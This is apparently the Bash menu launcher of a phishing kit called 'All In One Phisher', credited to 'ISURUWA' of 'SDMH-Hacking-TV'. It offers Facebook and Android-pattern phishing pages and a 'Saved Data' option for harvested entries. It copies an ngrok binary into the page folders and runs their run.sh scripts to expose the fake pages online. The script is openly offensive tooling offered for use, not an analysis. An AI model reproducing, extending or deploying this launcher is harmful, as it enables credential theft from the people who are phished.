function tool() {
clear
toilet -f mono12 -F gay "SDMH"
echo ""
echo -e "\e[96m           ------- SDMH-Hacking-TV 2021--------\e[0m";
echo -e "\e[95m----------- FB Phis and Android Pattern Hack ---------------\e[0m";
echo -e "\e[93m----------- Facebook - SDMH-Hacking-TV -----------\e[0m";
echo ""
echo ""
echo CODED BY ISURUWA | lolcat -a
echo -SD "";
echo -e "\e[93m[*] Phising Pages\e[0m";
echo -e "";
echo -e "\e[91m1.Facebook\e[0m";
echo -e "\e[96m2.Android Pattern\e[0m";
echo -e "\e[95m3.Saved Data \e[0m";
echo -e "\e[94m4.About\e[0m";
echo -e "\e[96m5.Update\e[0m";
echo -e "\e[92m6.Facebook\e[0m";
echo -e "\e[92m7.Youtube\e[0m";
echo -e "\e[94m8.Exit\e[0m";
echo -e "";
read -p "Enter Your Option : " userinput1;
#
if [ "${userinput1:-}" = "1" ]
then
	cd  source
	chmod +x *
	cp -f ngrok facebook
	cd facebook
	chmod +x *
	bash run.sh
fi

if [ "${userinput1:-}" = "2" ]
then
	cd source 
	chmod +x *
        cp -f ngrok telegram 
	cd pattern
	chmod +x *
	bash run.sh
fi
if [ "${userinput1:-}" = "3" ]
then
	bash saved.sh
fi
if [ "${userinput1:-}" = "4" ]
then
	bash about.sh
fi
if [ "${userinput1:-}" = "5" ]
then
	bash update.sh
fi
if [ "${userinput1:-}" = "6" ]
then
	bash fb.sh
fi
if [ "${userinput1:-}" = "7" ]
then
	bash youtu.sh	
fi
if [ "${userinput1:-}" = "8" ]
then
	bash exit.sh
fi

if [ "${userinput1:-}" = "" ]
then
	tool
fi
if [ "${userinput1:-}" != "" ]
then
	printf "                \e[1;92m [!] Invalid option!\e[0m\n"
	sleep 1
	tool
fi



}


clear
sleep 1
toilet -f mono12 -F gay "Fbphish444"
echo ""
echo -e "\e[96m           -------SDMH-Hacking-TV 2021--------\e[0m";
echo -e "\e[95m----------- FB Phis and Android Pattern Hack ----------\e[0m";
echo -e "\e[93m----------- Facebook - SDMH-Hacking-TV -----\e[0m";
echo ""
echo ""
echo  CODED BY ISURUWA | lolcat -a
echo -e "";
cowsay -f ghostbusters CODED BY ISURUWA | lolcat 
sleep 1
echo ""
echo "Turn On Hotspot " | lolcat
echo ""
read -p 'Press Enter To Continue 》' userinput1;
#
clear
toilet -f mono12 -F gay "AIOP"
echo ""
echo -e "\e[96m           -------Sri Lanka--------\e[0m";
echo -e "\e[95m----------- All In One Phisher -------------\e[0m";
echo -e "\e[93m----------- Whatsapp - +947793191314 -----\e[0m";
echo ""
echo ""
echo  CODED BY ISURUWA | lolcat -a
echo -SD "";
echo -e "\e[91m1.Start Tool\e[0m";
echo -e "\e[92m2.Saved Data\e[0m";
echo -e "\e[93m3.Update\e[0m";
echo -e "\e[94m4.About\e[0m";
echo -e "\e[95m5.More Tools\e[0m";
echo -e "\e[37m6.Exit\e[0m";
echo -e "";
echo -e "";
read -p 'Select Option 》》' userinput1;
#
if [ "${userinput1:-}" = "1" ]
then
	tool
fi
if [ "${userinput1:-}" = "2" ]
then
	bash saved.sh
fi
if [ "${userinput1:-}" = "3" ]
then
	bash update.sh
fi
if [ "${userinput1:-}" = "4" ]
then
	bash about.sh
fi
if [ "${userinput1:-}" = "5" ]
then
	am start -a android.intent.action.VIEW -d https://github.com/SDMH-Hacking-TV
	bash aiop.sh
fi
if [ "${userinput1:-}" = "6" ]
then
	bash exit.sh
fi
if [ "${userinput1:-}" = "" ]
then
	bash aiop.sh
fi
if [ "${userinput1:-}" != "" ]
then
	printf "                \e[1;92m [!] Invalid option!\e[0m\n"
	sleep 1
	bash aiop.sh
fi






